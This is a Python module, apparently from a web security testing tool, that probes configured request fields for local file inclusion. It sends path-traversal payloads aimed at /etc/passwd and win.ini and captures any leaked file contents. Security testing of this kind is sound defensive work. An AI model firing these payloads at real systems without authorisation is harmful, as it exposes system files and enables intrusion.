from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Local File Inclusion
    """
    payloads = [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
    ]
    fields = scenario.config.get("fields", ["file", "path"])
    issues = []
    leaked_data = [] # Capture what we found
    
    for field in fields:
        for p in payloads:
            if scenario.method == "GET":
                params = {field: p}
                resp = client.send(scenario.method, scenario.target, params=params)
            else:
                body = {field: p}
                resp = client.send(scenario.method, scenario.target, json_body=body)
                
            suspicious = False
            reasons = []
            
            if "root:x:0:0" in resp.text:
                suspicious = True
                reasons.append("Unix /etc/passwd content")
                leaked_data.append(f"PASSWD FILE: {resp.text[:200]}")
            if "[extensions]" in resp.text.lower() or "fonts" in resp.text.lower():
                suspicious = True
                reasons.append("Windows INI content")
                leaked_data.append(f"WIN.INI: {resp.text[:200]}")
                
            if suspicious:
                issues.append(f"[CRITICAL] LFI in '{field}': {', '.join(reasons)}")
                
    return {
        "scenario_id": scenario.id,
        "attack_type": "lfi",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
